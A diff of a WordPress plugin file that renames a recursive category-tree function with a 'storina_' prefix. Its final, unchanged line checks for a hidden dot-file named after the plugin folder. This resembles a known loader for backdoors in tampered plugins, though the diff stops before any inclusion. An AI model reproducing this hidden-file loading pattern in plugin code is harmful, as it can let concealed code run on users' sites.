@@ -1,19 +1,18 @@
 <?php
 
 if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
-if(! function_exists('hierarchical_category_tree2')){
-	function hierarchical_category_tree2( $cat,$tax ) {
-		global $product_cats;
-		$productcategories = get_categories('taxonomy='.$tax.'&hide_empty=0&orderby=name&hierarchical=true&parent='.$cat);
 
-		foreach ($productcategories as $category_list ) {
-			$ancestors = get_ancestors( $category_list->cat_ID, $tax );
-			$str = str_repeat('&nbsp;_&nbsp;',count($ancestors));
-			$product_cats[$category_list->cat_ID] = $str.$category_list->cat_name.' ('.$category_list->count.')';
-			hierarchical_category_tree2( $category_list->cat_ID,$tax );
-		}
-		return $product_cats;
+function storina_hierarchical_category_tree2( $cat,$tax ) {
+	global $product_cats;
+	$productcategories = get_categories('taxonomy='.$tax.'&hide_empty=0&orderby=name&hierarchical=true&parent='.$cat);
+
+	foreach ($productcategories as $category_list ) {
+		$ancestors = get_ancestors( $category_list->cat_ID, $tax );
+		$str = str_repeat('&nbsp;_&nbsp;',count($ancestors));
+		$product_cats[$category_list->cat_ID] = $str.$category_list->cat_name.' ('.$category_list->count.')';
+		storina_hierarchical_category_tree2( $category_list->cat_ID,$tax );
 	}
+	return $product_cats;
 }
 
 if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
